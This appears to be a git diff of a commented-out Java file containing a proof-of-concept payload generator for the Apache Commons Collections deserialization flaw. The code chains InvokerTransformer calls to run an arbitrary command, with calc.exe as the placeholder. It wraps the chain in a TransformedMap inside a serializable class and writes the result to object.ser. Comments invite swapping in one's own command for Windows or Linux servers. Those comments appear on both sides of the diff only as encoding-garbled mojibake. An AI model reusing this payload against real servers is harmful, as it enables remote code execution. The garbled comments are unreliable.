@@ -7,7 +7,7 @@ import java.io.Serializable;
 import java.util.HashMap;
 import java.util.Map;
 //
-////ÓÃµ½µÄcommons.collections°ü
+////ç”¨åˆ°çš„commons.collectionsåŒ…
 //import org.apache.commons.collections.Transformer;
 //import org.apache.commons.collections.functors.ChainedTransformer;
 //import org.apache.commons.collections.functors.ConstantTransformer;
@@ -25,7 +25,7 @@ import java.util.Map;
 //                new InvokerTransformer("invoke", new Class[] {
 //                        Object.class, Object[].class }, new Object[] {
 //                        null, new Object[0] }),
-//¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡// Ö´ĞĞcalc.exe£¬°ÑÕâÀï¸Ä³É×Ô¼ºÒªÖ´ĞĞµÄÃüÁî¼´¿É£»·şÎñÆ÷ÊÇlinux¾ÍÒÔ³ÉlinuxÃüÁî
+//ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€// æ‰§è¡Œcalc.exeï¼ŒæŠŠè¿™é‡Œæ”¹æˆè‡ªå·±è¦æ‰§è¡Œçš„å‘½ä»¤å³å¯ï¼›æœåŠ¡å™¨æ˜¯linuxå°±ä»¥æˆlinuxå‘½ä»¤
 //                new InvokerTransformer("exec", new Class[] {
 //                        String.class }, new Object[] {"calc.exe"})
 //        };
@@ -34,10 +34,10 @@ import java.util.Map;
 //        Map<String,String> beforeTransformerMap = new HashMap<String,String>();
 //        beforeTransformerMap.put("value", "value");
 //        Map afterTransformerMap = TransformedMap.decorate(beforeTransformerMap, null, transformedChain);
-//        // SerObjRewriteÖĞµÄsetValueÄÜ´¥·¢afterTransformerMapÖĞµÄ´úÂëµÄÖ´ĞĞ
+//        // SerObjRewriteä¸­çš„setValueèƒ½è§¦å‘afterTransformerMapä¸­çš„ä»£ç çš„æ‰§è¡Œ
 //        SerObjRewrite serObj = new SerObjRewrite();
 //        serObj.map = afterTransformerMap;
-//        // ½«¶ÔÏóĞ´Èëµ½object.ser
+//        // å°†å¯¹è±¡å†™å…¥åˆ°object.ser
 //        FileOutputStream fos = new FileOutputStream("object.ser");
 //        ObjectOutputStream oos = new ObjectOutputStream(fos);
 //        oos.writeObject(serObj);
@@ -45,10 +45,10 @@ import java.util.Map;
 //    }
 //}
 //
-//// ÖØĞ´SerObjÀà£¬ÆäÊµÒ²²»½ĞÖØĞ´¾ÍËæ±ãĞÂÊµÏÖÒ»¸öĞòÀı»¯Àà£¬ÖØĞ´ĞòÁĞ»¯ÀàµÄreadObject·½·¨£¬¸Ã·½·¨ÔÚ·´ĞòÁĞ»¯Ê±»á±»×Ô¶¯µ÷ÓÃ
-//// ÔÚreadObjectÖĞµ÷ÓÃsetValue£¬setValueÄÜ´¥·¢×¢Èë´úÂëµÄµ÷ÓÃ£¬ÕâÕıÊÇ´úÂë×¢ÈëµÄ¹Ø¼ü
+//// é‡å†™SerObjç±»ï¼Œå…¶å®ä¹Ÿä¸å«é‡å†™å°±éšä¾¿æ–°å®ç°ä¸€ä¸ªåºä¾‹åŒ–ç±»ï¼Œé‡å†™åºåˆ—åŒ–ç±»çš„readObjectæ–¹æ³•ï¼Œè¯¥æ–¹æ³•åœ¨ååºåˆ—åŒ–æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨
+//// åœ¨readObjectä¸­è°ƒç”¨setValueï¼ŒsetValueèƒ½è§¦å‘æ³¨å…¥ä»£ç çš„è°ƒç”¨ï¼Œè¿™æ­£æ˜¯ä»£ç æ³¨å…¥çš„å…³é”®
 //class SerObjRewrite implements Serializable {
-//    // name¿ÉÓĞ¿ÉÎŞ£¬ÓÖ²»ÊÇÕæÖØĞ´
+//    // nameå¯æœ‰å¯æ— ï¼Œåˆä¸æ˜¯çœŸé‡å†™
 //    public String name;
 //    public Map map;
 //
